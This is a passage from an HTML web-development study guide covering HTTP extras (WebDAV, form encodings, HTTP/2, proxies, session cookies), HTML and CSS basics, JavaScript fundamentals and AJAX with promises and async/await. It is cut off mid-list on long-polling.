            <tr><td>299</td><td>Persistent Warning — a general warning about something the proxy doesn't expect to change soon</td></tr>
          </table>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>WebDAV — basically FTP, but built out of HTTP</summary>
        <div class="topic-body">
          <p><strong>WebDAV</strong> extends HTTP so clients can author web content remotely — essentially giving you FTP-like file management (upload, download, delete, organize into folders) using HTTP's own existing verbs, plus one new one:</p>
          <ul>
            <li>Create/upload content at a URI using <strong>PUT</strong> (already a normal HTTP verb).</li>
            <li>Download it back using <strong>GET</strong>.</li>
            <li>Delete it using <strong>DELETE</strong>.</li>
            <li>Make folders/collections using a WebDAV-specific new verb: <strong>MKCOL</strong> (short for "MaKe COLlection").</li>
          </ul>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Forms — how HTML turns into HTTP bodies</summary>
        <div class="topic-body">
          <p>When a form submits, its <code>Content-Type</code> tells the server how to parse the body. There are two you'll see constantly:</p>
          <ul>
            <li><code>application/x-www-form-urlencoded</code> — the simple case, just <code>key=value&amp;key2=value2</code>, the same shape as a URL query string.</li>
            <li><code>multipart/form-data</code> — used whenever you're uploading files. The body gets split into separate labeled "parts," each divided by a random boundary string, because a file's raw binary content can't safely be squeezed into the simple key=value format (it might contain characters that would be misread as delimiters).</li>
          </ul>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>HTTP/2 — the same protocol, made faster</summary>
        <div class="topic-body">
          <p>HTTP/2 (2015) is based on Google's earlier SPDY protocol, and in browsers it only works over HTTPS. It keeps all of HTTP/1's methods, status codes, and headers — it's purely a transport-level speed upgrade, not a redesign of the "meaning" of HTTP. Three tricks make it faster:</p>
          <ul>
            <li><strong>Pipelining</strong> — send multiple requests without waiting for each response to finish first.</li>
            <li><strong>Push</strong> — the server proactively sends content it predicts you'll need, before you even ask.</li>
            <li><strong>Multiplexing</strong> — interleave many requests and responses over a single connection, which avoids the overhead of opening many separate slow TCP/TLS connections just to fetch a page's dozen images and scripts.</li>
          </ul>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Proxies — forward vs. reverse</summary>
        <div class="topic-body">
          <p>A proxy sits between a client and a server, forwarding requests on someone's behalf — but <em>whose</em> behalf makes all the difference.</p>
          <div class="diagram">
            <div class="mermaid">
flowchart LR
    U[You / Client] -->|you set this up yourself| FP[Forward Proxy] --> Internet((Internet))
    Internet2((Internet)) --> RP[Reverse Proxy<br/>set up by the site's owner] --> WS[Real Web Server]
            </div>
          </div>
          <table>
            <tr><th></th><th>Forward Proxy</th><th>Reverse Proxy</th></tr>
            <tr><td>Who sets it up</td><td>The client (you)</td><td>The server's owner</td></tr>
            <tr><td>Typical example</td><td>Watching geo-blocked content by routing through a different country</td><td>Cloudflare, a load balancer in front of a company's servers</td></tr>
            <tr><td>What it's for</td><td>Forwards <em>your</em> outgoing requests, often to hide or change where they appear to come from</td><td>Forwards incoming requests <em>to</em> the real backend server(s), often handling caching, TLS termination, load balancing, and fail-over along the way</td></tr>
          </table>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Session cookies — how "staying logged in" actually works</summary>
        <div class="topic-body">
          <p>HTTP by itself has no memory between requests — each one is independent. Cookies are the standard patch for that. Here's the flow step by step:</p>
          <ol>
            <li>You visit a site for the first time. You have no cookie yet, so your browser sends no <code>Cookie:</code> header.</li>
            <li>The server generates a large random session ID (e.g. <code>86e7eca9-d484-48ad-98ed-e060541b7870</code>), stores it in its own database, and sends it back to you with <code>Set-Cookie: s=86e7eca9-...; Secure; HttpOnly; SameSite=strict</code>.</li>
            <li>From that point on, your browser automatically re-attaches <code>Cookie: s=86e7eca9-...</code> to every future request to that site — this is what makes you appear "logged in" without re-entering your password each time.</li>
          </ol>
          <p>The flags matter: <code>Secure</code> means the cookie is only ever sent over HTTPS; <code>HttpOnly</code> blocks JavaScript from reading it (a defense against certain attacks, covered in Chapter 10); <code>SameSite=strict</code> stops it from being sent along with requests that originate from other sites (a defense against CSRF, also Chapter 10).</p>
        </div>
      </details>

      <div class="chapter-footer-nav"><a class="footer-nav-btn" href="#ch1" data-target="ch1">← Internet &amp; Web</a><a class="footer-nav-btn" href="#ch3" data-target="ch3">Next: HTML &amp; CSS →</a></div>
    </section>

    <section class="chapter" id="ch3">
      <div class="chapter-head"><span class="chapter-num">03</span><h2>HTML &amp; CSS</h2></div>
      <p class="chapter-intro">HTML describes <em>what</em> content is (a paragraph, a link, an image); CSS describes <em>how it should look</em>. Keeping those two jobs separate is the single most important idea in this chapter.</p>

      <details class="topic" open>
        <summary><span class="chevron"></span>The basic document skeleton</summary>
        <div class="topic-body">
          <p>Every modern HTML page starts the same way:</p>
          <pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;...&lt;/head&gt;
  &lt;body&gt;...&lt;/body&gt;
&lt;/html&gt;</code></pre>
          <p>The <code>&lt;!DOCTYPE html&gt;</code> line isn't decorative — it's a signal to the browser "treat this as modern HTML, not some old quirks-mode document from the 90s." Leaving it out can silently change how the browser lays out your page.</p>
          <p>There are actually two competing standards bodies for HTML today: <strong>WHATWG's "Living Standard"</strong>, which is continuously updated (no version numbers, it just evolves), and <strong>W3C's HTML5</strong>, which is versioned more like normal software releases (5.1, 5.2, ...). Most developers lean on the WHATWG standard day-to-day, but because not every browser keeps up with it instantly, it's worth checking browser compatibility tables before relying on brand-new features.</p>
          <p>You can also write HTML using strict XML syntax — this is called <strong>XHTML</strong>. It's worth knowing that valid HTML is <em>not</em> automatically valid XML, and valid XML is not automatically valid HTML — they have subtly different rules (for example, XML is far less forgiving of small mistakes; one unclosed tag can make an entire XML document fail to parse, where HTML parsers are much more forgiving and just guess what you meant).</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span><code>&lt;head&gt;</code> vs. <code>&lt;body&gt;</code></summary>
        <div class="topic-body">
          <div class="diagram">
            <div class="mermaid">
flowchart TD
    HTML["&lt;html&gt;"] --> HEAD["&lt;head&gt;<br/>metadata: title, charset,<br/>CSS links, meta tags"]
    HTML --> BODY["&lt;body&gt;<br/>everything visible:<br/>text, images, links, forms"]
            </div>
          </div>
          <p>The <code>&lt;head&gt;</code> holds information <em>about</em> the page, none of which is directly visible: the <code>&lt;title&gt;</code> shown in the browser tab, <code>&lt;meta charset="UTF-8"&gt;</code> (which tells the browser how to decode the text encoding — get this wrong and you'll see garbled characters), links to CSS stylesheets, and SEO-related meta tags like a page description.</p>
          <p>The <code>&lt;body&gt;</code> is everything that actually renders on screen — paragraphs, images, links, forms, all of it.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Tags — start, end, and void</summary>
        <div class="topic-body">
          <p>Most tags come in pairs: a start tag <code>&lt;tag&gt;</code> and a matching end tag <code>&lt;/tag&gt;</code>, wrapping around whatever content they contain. A handful of tags are <strong>void tags</strong> — they never have (or need) a closing tag, because they can never contain other content. <code>&lt;br&gt;</code> (line break) and <code>&lt;img&gt;</code> (image) are the two most common examples.</p>
          <p>Lowercase tag names by convention — HTML technically allows any capitalization, but sticking to lowercase avoids confusion and matches what virtually every style guide expects.</p>
          <table>
            <tr><th>Tag</th><th>Purpose</th></tr>
            <tr><td><code>&lt;p&gt;</code></td><td>A paragraph. Extra whitespace inside it is collapsed and ignored — use <code>&lt;br&gt;</code> if you specifically need a line break.</td></tr>
            <tr><td><code>&lt;img src="..." alt="..."&gt;</code></td><td>An image. Always set <code>alt</code> — it's read aloud by screen readers for accessibility, and used by search engines that can't "see" the image itself.</td></tr>
            <tr><td><code>&lt;a href="..."&gt;</code></td><td>A hyperlink. The target can be absolute or relative, and can point elsewhere on the same page using a <code>#fragment</code>.</td></tr>
            <tr><td><code>&lt;div&gt;</code></td><td>A generic block-level container — forces a line break before and after it.</td></tr>
            <tr><td><code>&lt;span&gt;</code></td><td>A generic inline container — doesn't force a line break, sits within the flow of text.</td></tr>
          </table>
          <p>Here's the subtlety worth remembering: <code>&lt;div&gt;</code> and <code>&lt;span&gt;</code> carry <strong>no inherent meaning or styling of their own</strong>. They exist purely as hooks — you attach a <code>class</code> or <code>id</code> to them, and then style <em>that</em> with CSS. Using them "as-is" with no class does nothing visually except the automatic block/inline behavior.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>CSS — the Cascading part actually means something</summary>
        <div class="topic-body">
          <p>"Cascading" isn't just a nice-sounding word — it describes a real mechanic: child elements <strong>inherit</strong> style properties from their parent element unless something more specific overrides them. Set a font color on <code>&lt;body&gt;</code>, and every paragraph inside it inherits that color automatically, unless a more specific rule says otherwise.</p>
          <p>You can apply CSS in three ways:</p>
          <pre><code>&lt;link rel="stylesheet" href="style.css"&gt;     &lt;!-- external file --&gt;
&lt;style&gt; p { color: red; } &lt;/style&gt;            &lt;!-- inline block, in the head --&gt;
&lt;p style="color:orange"&gt;Direct style&lt;/p&gt;      &lt;!-- inline attribute, on one element --&gt;</code></pre>
          <p>External stylesheets are almost always the right choice for anything beyond a quick test — they let the browser cache the CSS separately from the HTML, and keep your styling centralized instead of scattered across every element.</p>
          <p><strong>Selectors</strong> decide which elements a rule applies to:</p>
          <table>
            <tr><th>Selector</th><th>Targets</th><th>Example</th></tr>
            <tr><td>Tag</td><td>Every element of that tag</td><td><code>p { }</code></td></tr>
            <tr><td><code>.class</code></td><td>Every element with <code>class="x"</code></td><td><code>.highlight { }</code></td></tr>
            <tr><td><code>#id</code></td><td>The one element with <code>id="x"</code> (IDs must be unique per page)</td><td><code>#header { }</code></td></tr>
            <tr><td><code>:pseudo-class</code></td><td>A state or context</td><td><code>:hover</code>, <code>:nth-child(2)</code></td></tr>
          </table>
          <div class="callout warn"><span class="callout-label">Gotcha</span><p><code>:nth-child()</code> counts starting from <strong>1</strong>, not 0 — unlike array indexing in most programming languages. <code>:nth-child(2)</code> means the second child, not the third.</p></div>
          <p><strong>Positioning</strong> controls where an element sits relative to everything else:</p>
          <ul>
            <li><code>position: fixed</code> — stays glued to one spot on the screen, even as the page scrolls.</li>
            <li><code>position: relative</code> — offset from wherever it would normally sit.</li>
            <li><code>position: absolute</code> — offset from the nearest ancestor that has its own position set (often the whole page, if nothing else qualifies).</li>
            <li><code>z-index</code> — when elements overlap, the higher number sits visually on top.</li>
          </ul>
          <p>For centering and alignment (a famously fiddly problem in older CSS), modern layouts lean on <code>flex</code> or <code>grid</code>, plus alignment properties like <code>text-align</code>, <code>align-content</code>, and <code>justify-content</code>.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Forms — turning user input into an HTTP request</summary>
        <div class="topic-body">
          <p>Forms are the bridge between HTML (what the user sees and types into) and HTTP (what actually gets sent to the server).</p>
          <pre><code>&lt;form action="/submit" method="post"&gt;
  What's your name? &lt;input name="name"&gt;
  &lt;input type="submit"&gt;
&lt;/form&gt;</code></pre>
          <p><code>method</code> chooses GET or POST. <code>action</code> is the URI the data gets sent to. Every <code>&lt;input name="x"&gt;</code> becomes one <code>key=value</code> pair in the eventual request — the <code>name</code> attribute <em>is</em> the key, and whatever the user typed (or selected) becomes the value. <code>&lt;select&gt;</code> gives you a dropdown built from a list of <code>&lt;option&gt;</code> elements. File uploads specifically require adding <code>enctype="multipart/form-data"</code> to the <code>&lt;form&gt;</code> tag — without it, the browser will try (and fail) to send binary file data using the plain text-based encoding.</p>
          <p>The <code>&lt;input&gt;</code> tag's <code>type</code> attribute isn't limited to just "text" — there's a long list of built-in types, each changing how the browser presents and validates the field: <code>button, checkbox, color, date, datetime, datetime-local, email, file, hidden, image, month, number, password, radio, range, reset, search, submit, tel, text, time, url, week</code>. A couple worth calling out specifically: <code>radio</code> inputs sharing the same <code>name</code> let the user pick only one option from the group, and <code>hidden</code> inputs carry a value along with the form submission without ever being shown or editable by the user.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>CGI — a brief bit of history worth knowing</summary>
        <div class="topic-body">
          <p>Before frameworks like Django or Flask existed, the standard way to generate dynamic HTML was <strong>CGI</strong> (Common Gateway Interface) — a convention, not a language, so you could write a CGI program in literally any language that could print text, read environment variables, and read from standard input.</p>
          <p>CGI fell out of favor for good reasons: it typically spins up a brand-new process for <em>every single request</em>, which is slow; it has no natural way to share state between requests; and it offers no object-oriented abstraction over what a "request" even is — you're working with raw text and environment variables by hand.</p>
        </div>
      </details>

      <div class="chapter-footer-nav"><a class="footer-nav-btn" href="#ch2" data-target="ch2">← HTTP</a><a class="footer-nav-btn" href="#ch4" data-target="ch4">Next: JavaScript →</a></div>
    </section>

    <section class="chapter" id="ch4">
      <div class="chapter-head"><span class="chapter-num">04</span><h2>JavaScript</h2></div>
      <p class="chapter-intro">JavaScript was written by Brendan Eich in about <strong>10 days</strong> in 1995 for Netscape. That rushed origin explains a lot of its quirks — and those quirks are exactly what interviewers love to ask about.</p>

      <details class="topic" open>
        <summary><span class="chevron"></span>Where it runs, and why it's everywhere</summary>
        <div class="topic-body">
          <p>JavaScript is multi-paradigm — you can write it imperatively, functionally, in an object-oriented style, using prototypes, or in a purely event-driven way, often mixing several of these in one file. It now runs far beyond the browser: on servers (Node.js), even inside PDFs. Modern JS engines also compile hot code paths down to machine code, so despite being an interpreted scripting language, it's genuinely fast in practice.</p>
          <pre><code>&lt;script src="myscript.js"&gt;&lt;/script&gt;  &lt;!-- external file — keeps the HTML's cache separate --&gt;
&lt;script&gt; var x = 1; &lt;/script&gt;        &lt;!-- inline --&gt;</code></pre>
          <p>Loading JS from a separate file (rather than inlining it) matters for a subtle performance reason covered later in Chapter 12: it lets the browser cache the HTML and the JavaScript <em>independently</em>. If you update your script, you don't invalidate the cached HTML page, and vice versa.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Scope — <code>var</code> vs. <code>let</code> vs. <code>const</code></summary>
        <div class="topic-body">
          <p>By default, simply assigning to an undeclared variable name creates a <strong>global</strong> variable — almost never what you actually want, since it can silently clash with variables elsewhere in a large codebase. To create a properly scoped local variable, you use one of three keywords, and the differences between them are a classic source of subtle bugs.</p>
          <table>
            <tr><th>Keyword</th><th>Scope</th></tr>
            <tr><td><code>var</code></td><td>Scoped to the entire enclosing <em>function</em> — and "hoisted" to the top of that function, meaning the variable technically exists (as <code>undefined</code>) even before the line that declares it runs.</td></tr>
            <tr><td><code>let</code></td><td>Scoped to the enclosing <em>block</em> — the nearest pair of curly braces <code>{ }</code>, e.g. a single loop iteration or if-statement.</td></tr>
            <tr><td><code>const</code></td><td>Same block-scoping as <code>let</code>, but the variable binding can never be reassigned after its initial value.</td></tr>
          </table>
          <p>Here's why this actually bites people: with <code>var</code>, a variable declared inside a <code>for</code> loop leaks out and is visible (and still holds its <em>final</em> value) after the loop ends — surprising if you expected it to be scoped to each iteration. With <code>let</code>, the same variable is genuinely trapped inside each iteration's block, which is almost always the behavior you actually want.</p>
          <div class="callout tip"><span class="callout-label">Rule of thumb</span><p>Default to <code>const</code> for anything you won't reassign, <code>let</code> for anything you will, and avoid <code>var</code> entirely in new code.</p></div>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Closures — the concept behind half of all JS interview questions</summary>
        <div class="topic-body">
          <p>A <strong>closure</strong> happens when an inner function "remembers" the variables from the function it was created inside — even after that outer function has already finished running and returned. This isn't a special syntax you opt into; it happens automatically, every single time a function is created inside another function.</p>
          <pre><code><span class="tok-key">function</span> <span class="tok-fn">outer</span>(text) {
  <span class="tok-key">function</span> <span class="tok-fn">inner</span>(x) { alert(text); }
  <span class="tok-key">return</span> inner;
}
<span class="tok-key">var</span> f = outer(<span class="tok-str">"hi mom"</span>);
f(1); <span class="tok-com">// still remembers "hi mom", even though outer() already returned</span></code></pre>
          <p>Think of it like this: when <code>outer("hi mom")</code> runs, JavaScript doesn't just throw away its local variables the moment the function returns — because <code>inner</code> still has a live reference to that specific scope, the variable <code>text</code> stays alive, tucked away inside <code>inner</code>'s "backpack," for as long as <code>inner</code> itself still exists. Call <code>outer()</code> again with a different argument, and you get a <em>completely separate</em> backpack, independent of the first one — this is how you can build things like private counters or memoized functions in JavaScript.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span><code>this</code> — not what you'd expect coming from other languages</summary>
        <div class="topic-body">
          <p>In Python, a method's first parameter is explicitly <code>self</code>, and it's unambiguous which object it refers to. JavaScript's <code>this</code> works completely differently: it's <strong>not</strong> automatically bound to the object a method belongs to — instead, its value is determined by <em>how the function is actually called</em> at runtime, not where it was written.</p>
          <pre><code><span class="tok-key">class</span> Quiz {
  write() { console.log(<span class="tok-key">this</span>); }
}
quiz = <span class="tok-key">new</span> Quiz();
w = quiz.write;   <span class="tok-com">// "detaches" write from quiz</span>
w();              <span class="tok-com">// 'this' inside write is no longer quiz — often undefined!</span></code></pre>
          <p>This trips people up constantly, especially when passing a method as a callback (e.g., to an event listener) — the moment it's called <em>without</em> being attached to the original object (<code>quiz.write()</code>), it loses track of what <code>this</code> should mean. You fix it three ways: call it explicitly as <code>quiz.write()</code>, force the binding permanently with <code>w = quiz.write.bind(quiz)</code>, or use an <strong>arrow function</strong> (<code>=&gt;</code>), which deliberately does <em>not</em> get its own <code>this</code> — it inherits <code>this</code> from wherever it was <em>defined</em>, not from how it's eventually called. This is exactly why arrow functions are so popular for callbacks today.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Type coercion and equality — where the "bad parts" reputation comes from</summary>
        <div class="topic-body">
          <p>JavaScript will happily convert between types for you, silently, whenever an operator doesn't quite match what you gave it — with a strong bias toward turning things into strings or floats.</p>
          <pre><code><span class="tok-str">"1"</span> + <span class="tok-num">1</span>        <span class="tok-com">// "11"  — the string wins, numbers get coerced to text</span>
<span class="tok-num">1</span> + <span class="tok-num">1</span>          <span class="tok-com">// 2</span>
<span class="tok-num">0.1</span> + <span class="tok-num">0.2</span>      <span class="tok-com">// 0.30000000000000004 — a rounding error, because ALL numbers in JS are doubles</span></code></pre>
          <table>
            <tr><th>Operator</th><th>Meaning</th><th>Example</th></tr>
            <tr><td><code>==</code></td><td>Abstract equality — coerces types <em>before</em> comparing</td><td><code>3 == "3"</code> → <code>true</code></td></tr>
            <tr><td><code>===</code></td><td>Strict equality — requires the types to already match</td><td><code>3 === "3"</code> → <code>false</code></td></tr>
          </table>
          <p><strong>Always prefer <code>===</code></strong> — it removes a whole category of subtle bugs caused by unexpected implicit conversion. One extra oddity worth remembering: <code>NaN === NaN</code> is actually <code>false</code> (NaN is defined to never equal anything, including itself) — to check for it, use the dedicated function <code>isNaN(x)</code> instead.</p>
          <p>JavaScript also has a specific list of <strong>falsy</strong> values — everything else is truthy, including things you might not expect, like an empty array or object: <code>false, null, undefined, '', 0, NaN</code>.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Explicitly casting numbers and strings</summary>
        <div class="topic-body">
          <p>Since every number in JavaScript is really a double, there's no built-in "integer" type to cast to — instead you round using one of the <code>Math</code> methods, each rounding differently:</p>
          <pre><code>Math.floor(<span class="tok-num">0.7</span>)   <span class="tok-com">// 0 — always rounds down</span>
Math.ceil(<span class="tok-num">0.7</span>)    <span class="tok-com">// 1 — always rounds up</span>
Math.round(<span class="tok-num">0.7</span>)   <span class="tok-com">// 1 — rounds to the nearest whole number</span>
Math.trunc(<span class="tok-num">0.7</span>)   <span class="tok-com">// 0 — just chops off the decimal part</span></code></pre>
          <p>Going the other way (text → number), you have a few equivalent options, and JavaScript will even parse hexadecimal strings for you:</p>
          <pre><code>parseFloat(<span class="tok-str">"127"</span>)   <span class="tok-com">// 127</span>
Number(<span class="tok-str">"0x7F"</span>)     <span class="tok-com">// 127 — Number() understands hex strings</span>
+<span class="tok-str">"0x7F"</span>          <span class="tok-com">// 127 — unary plus is shorthand for Number()</span></code></pre>
          <p>And converting a number to a string, several equally valid spellings of the same idea:</p>
          <pre><code><span class="tok-str">""</span> + <span class="tok-num">1</span>            <span class="tok-com">// "1"</span>
String(<span class="tok-num">1</span>)          <span class="tok-com">// "1"</span>
(<span class="tok-num">1</span>).toString()     <span class="tok-com">// "1"</span>
(<span class="tok-num">127</span>).toString(<span class="tok-num">16</span>)  <span class="tok-com">// "7F" — pass a radix to convert to another base</span></code></pre>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Arrays and Objects</summary>
        <div class="topic-body">
          <pre><code><span class="tok-key">var</span> arr = [<span class="tok-num">1</span>,<span class="tok-num">2</span>,<span class="tok-num">3</span>];         <span class="tok-com">// 0-indexed, like most languages</span>
<span class="tok-key">for</span> (<span class="tok-key">let</span> i <span class="tok-key">of</span> arr) { }     <span class="tok-com">// iterates over the VALUES: 1, 2, 3</span>
<span class="tok-key">for</span> (<span class="tok-key">let</span> i <span class="tok-key">in</span> arr) { }     <span class="tok-com">// iterates over the INDICES: 0, 1, 2</span>

<span class="tok-key">var</span> obj = { name: <span class="tok-str">"A"</span>, job: <span class="tok-str">"B"</span> };
obj.name === obj[<span class="tok-str">"name"</span>];  <span class="tok-com">// both access styles work identically</span></code></pre>
          <p>Nearly everything in JavaScript is technically an object, except for the primitive types — booleans, numbers, and strings (which still have <em>methods</em> you can call, like <code>"hi".length</code>, they just don't have arbitrary custom <em>properties</em> the way real objects do). One detail that matters a lot in practice: objects (and arrays) are passed around <strong>by reference</strong>, not by value — pass an object into a function and mutate it inside, and the caller sees that mutation too.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Prototypes and Classes</summary>
        <div class="topic-body">
          <p>Under the hood, every JavaScript object inherits properties and methods from a <strong>prototype</strong> object — essentially a shared template object it points back to. Modern code almost always uses the cleaner <code>class</code> syntax introduced in ES2015, which is really just friendlier syntax sitting on top of that same prototype system:</p>
          <pre><code><span class="tok-key">class</span> Pokemon {
  constructor(name, level) { <span class="tok-key">this</span>.name = name; <span class="tok-key">this</span>.level = level; }
  levelUp() { <span class="tok-key">this</span>.level += <span class="tok-num">1</span>; }
}</code></pre>
          <p>Older codebases you might encounter use <strong>constructor functions</strong> instead — functionally equivalent, but everything (including methods) has to be defined by hand inside the function body or manually attached to <code>.prototype</code>, rather than using the tidier <code>class</code> block.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>The DOM — how JavaScript actually touches the page</summary>
        <div class="topic-body">
          <p>The browser parses your HTML into the <strong>DOM</strong> (Document Object Model) — a tree of live objects that JavaScript can read and modify. Change the DOM, and the page visually updates immediately; there's no separate "re-render the HTML" step you need to trigger.</p>
          <div class="diagram">
            <div class="mermaid">
flowchart TD
    Doc[document] --> HTMLroot["&lt;html&gt;"]
    HTMLroot --> Head["&lt;head&gt;"]
    HTMLroot --> Body["&lt;body&gt;"]
    Body --> P["&lt;p&gt;A paragraph&lt;/p&gt;"]
    Body --> Div["&lt;div&gt;"]
    Div --> A["&lt;a href=...&gt;"]
            </div>
            <div class="diagram-caption">The DOM mirrors your HTML as a tree of objects</div>
          </div>
          <pre><code>document.querySelector(<span class="tok-str">"#id"</span>)           <span class="tok-com">// CSS-style selector — the modern, flexible way</span>
document.getElementById(<span class="tok-str">"id"</span>)
document.getElementsByClassName(<span class="tok-str">"cls"</span>)
document.getElementsByTagName(<span class="tok-str">"div"</span>)

<span class="tok-key">var</span> el = document.createElement(<span class="tok-str">"a"</span>);   <span class="tok-com">// build brand new elements in memory</span>
el.textContent = <span class="tok-str">"Click me"</span>;
parent.appendChild(el);                     <span class="tok-com">// actually insert it into the visible page</span></code></pre>
          <p>jQuery used to be essentially mandatory for this kind of DOM work, because older browsers had wildly inconsistent APIs for it. Modern browsers have since standardized and absorbed most of what jQuery offered natively (<code>querySelector</code> is a direct descendant of jQuery's <code>$()</code> selector syntax) — so for new projects, plain JavaScript is usually enough.</p>
        </div>
      </details>

      <div class="chapter-footer-nav"><a class="footer-nav-btn" href="#ch3" data-target="ch3">← HTML &amp; CSS</a><a class="footer-nav-btn" href="#ch5" data-target="ch5">Next: AJAX →</a></div>
    </section>

    <section class="chapter" id="ch5">
      <div class="chapter-head"><span class="chapter-num">05</span><h2>AJAX</h2></div>
      <p class="chapter-intro">AJAX is the trick that turned the web from "click a link, wait, get a whole new page" into apps that update themselves live, in place, without ever reloading.</p>

      <details class="topic" open>
        <summary><span class="chevron"></span>What AJAX actually solves</summary>
        <div class="topic-body">
          <p><strong>AJAX</strong> stands for Asynchronous JavaScript And XML — though in practice today, the "X" is almost always a lie; nearly everyone uses <strong>JSON</strong> instead of XML now. The name stuck around anyway.</p>
          <p>The core idea: JavaScript running in the browser can fire off its own HTTP requests <em>in the background</em>, read the response, and update the page — all without triggering a full page reload. This is exactly what makes something like Twitter's timeline feel "alive": new tweets can appear without the whole page flashing and reloading.</p>
          <p>It's not free, though. Because the page technically never navigates anywhere, the browser's normal back-button/history/bookmark behavior stops working automatically — you have to manually wire that up yourself in JavaScript if you want it. Browsers also heavily restrict what AJAX requests are allowed to do, via the <strong>Same-Origin Policy</strong>, specifically to stop malicious scripts from silently making requests to other sites using your logged-in session. And, somewhat ironically for a "performance" feature, using AJAX heavily generally means <em>more</em> total HTTP requests, not fewer — so it trades one kind of cost (full page reloads) for another (many small background requests).</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Promises — the modern way to handle "this will finish later"</summary>
        <div class="topic-body">
          <p>A network request doesn't finish instantly — it might take 20 milliseconds or 3 seconds. JavaScript can't just "pause and wait" for it (that would freeze your entire page), so it needs a way to say "run this code <em>later</em>, whenever the response actually arrives." That's what a <strong>Promise</strong> is: an object representing a value that doesn't exist yet, but will (or will fail to) at some point.</p>
          <pre><code><span class="tok-key">var</span> request = <span class="tok-key">new</span> Request(<span class="tok-str">"some-url"</span>);
fetch(request).then(response => {
    <span class="tok-key">return</span> response.json();     <span class="tok-com">// this itself returns ANOTHER promise</span>
}).then(data => {
    console.log(data);
});</code></pre>
          <div class="diagram">
            <div class="mermaid">
sequenceDiagram
    participant JS as Your Code
    participant B as Browser
    participant S as Server
    JS->>B: fetch(request)
    B->>S: HTTP Request (async, non-blocking)
    Note over JS: Your code keeps running immediately — it doesn't freeze here
    S-->>B: HTTP Response (arrives later)
    B-->>JS: Promise resolves → the .then() callback finally runs
            </div>
          </div>
          <p>Every <code>.then(onSuccess, onFailure)</code> call itself returns a <em>brand-new</em> promise — which is exactly what lets you chain multiple steps together in sequence, each one only running after the previous step actually finished. Before promises existed, developers used the older, much more verbose <code>XMLHttpRequest</code> API, which required manually tracking connection state through an <code>onreadystatechange</code> callback — <code>fetch()</code> plus Promises is dramatically cleaner for the same job.</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span><code>async</code> / <code>await</code> — promises, dressed up to look synchronous</summary>
        <div class="topic-body">
          <p><code>async</code>/<code>await</code> doesn't replace Promises — it's just a nicer way of <em>writing</em> code that uses them, so it reads top-to-bottom like ordinary blocking code instead of a chain of <code>.then()</code> calls.</p>
          <pre><code><span class="tok-key">async function</span> get() {
  <span class="tok-key">var</span> json = <span class="tok-key">await</span> fetchJSON(url);   <span class="tok-com">// execution pauses right here until the promise resolves</span>
  console.log(json);
}</code></pre>
          <p>Marking a function <code>async</code> makes it automatically return a Promise. Inside it, <code>await</code> pauses execution of <em>that function</em> until the awaited promise settles — but critically, it does <em>not</em> freeze the rest of the browser; other code can still run in the meantime.</p>
          <div class="callout warn"><span class="callout-label">Common gotcha</span><p>Using <code>await</code> inside a loop makes each iteration wait for the previous one to fully finish before starting the next — turning what could have been several requests running in parallel into a slow, one-at-a-time sequence. If you actually want parallelism, either use <code>.then()</code> chains that don't block each other, or gather all the promises first and use <code>Promise.all()</code>.</p></div>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>JSON — the data format AJAX actually uses today</summary>
        <div class="topic-body">
          <p>JSON (JavaScript Object Notation) is, despite the name, a language-independent, strict subset of JavaScript's own object literal syntax — which is exactly why it became so popular for AJAX: browsers could parse it natively and fast, with basically no extra library needed.</p>
          <ul>
            <li><code>JSON.parse(text)</code> — turns raw JSON text into a real JavaScript object you can work with.</li>
            <li><code>JSON.stringify(obj)</code> — turns a JavaScript object back into JSON text, ready to send over the network.</li>
          </ul>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>Design philosophy — minimize requests, don't maximize them</summary>
        <div class="topic-body">
          <p>It's tempting, once you have AJAX, to fire off a request for every tiny user interaction. The course notes are explicit that this is the wrong instinct: the actual design goal is to <strong>minimize</strong> AJAX traffic, by batching related requests together instead of firing one per micro-event, using sensible timers instead of hooking every possible DOM event, and never polling faster than the situation actually needs — the notes point out that even for something like a live drawing app, you rarely need more than 30 updates per second, since that's already beyond what the human eye can distinguish as "smooth."</p>
        </div>
      </details>

      <details class="topic" open>
        <summary><span class="chevron"></span>The Observer pattern — how to fake "the server pushing to me"</summary>
        <div class="topic-body">
          <p>The <strong>Observer pattern</strong> is a general software design pattern: an "observable" object keeps a list of "observers" (listeners), and whenever it changes, it notifies all of them.</p>
          <div class="diagram">
            <div class="mermaid">
classDiagram
    class Observable {
      +list of Observers
      +notify()
    }
    class Observer {
      +update()
    }
    Observable --> Observer : notifies
            </div>
          </div>
          <p>This pattern works beautifully when <em>both</em> the observable and its observers live in the same browser tab — plain JavaScript event listeners are already exactly this pattern. It gets much trickier when you want the observer to be the browser and the observable to be a remote server, because HTTP is fundamentally stateless and the browser doesn't run its own listening server that the backend could push to directly. In practice, people fake it a few different ways:</p>
          <ul>
            <li><strong>Polling</strong> — by far the most common approach: just ask the server "anything new?" on a repeating timer.</li>
            <li><strong>Long-polling ("Comet")</strong> — the server deliberately holds the connection open and delays its response until there's actually something new to report, which reduces wasted "no, nothing changed" round trips, at the cost of more complex server-side handling.</li>
